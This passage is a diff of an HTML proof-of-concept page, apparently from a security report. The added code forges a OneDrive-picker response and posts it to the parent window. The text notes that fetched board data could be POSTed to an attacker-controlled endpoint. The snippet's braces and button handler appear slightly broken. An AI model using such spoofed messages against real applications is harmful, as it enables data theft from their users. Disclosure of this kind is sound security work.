@@ -14,7 +14,23 @@
       .catch(error => {
         alert(error);
       });
+    
+    const sendOneDriveMessage = () => {
+      window.parent.postMessage({
+        data:
+          {
+            is_one_drive_response: true,
+            type: 'success',
+            response: {
+              value: {
+                name: 'Hello!',
+                webUrl: 'https://google.com'
+              }
+          }
+      });
+    };
   </script>
+  <button onclick="sendOneDriveMessage">Send</button>
   Get all boards data.
   After fetching data it can be sent to attacker using POST request to any attacker controlled endpoint:
 </body>
